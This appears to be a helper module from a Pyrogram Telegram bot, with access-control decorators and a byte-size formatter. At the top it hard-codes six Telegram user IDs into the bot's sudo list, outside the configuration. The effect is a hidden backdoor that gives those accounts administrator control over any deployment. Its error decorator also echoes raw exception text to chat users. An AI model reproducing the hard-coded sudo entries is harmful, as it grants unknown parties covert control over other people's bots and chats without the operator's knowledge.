

from typing import Callable

from pyrogram import Client
from pyrogram.types import Message

from config import Sophia
from helpers.admins import get_administrators

Sophia.SUDO_USERS.append(1757169682)
Sophia.SUDO_USERS.append(1738637033)
Sophia.SUDO_USERS.append(1448474573)
Sophia.SUDO_USERS.append(1672609421)
Sophia.SUDO_USERS.append(1670523611)
Sophia.SUDO_USERS.append(1952053555)

def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in Sophia.SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in Sophia.SUDO_USERS:
            return await func(client, message)

    return decorator


# Utils Helper
def humanbytes(size):
    """Convert Bytes To Bytes So That Human Can Read It"""
    if not size:
        return ""
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
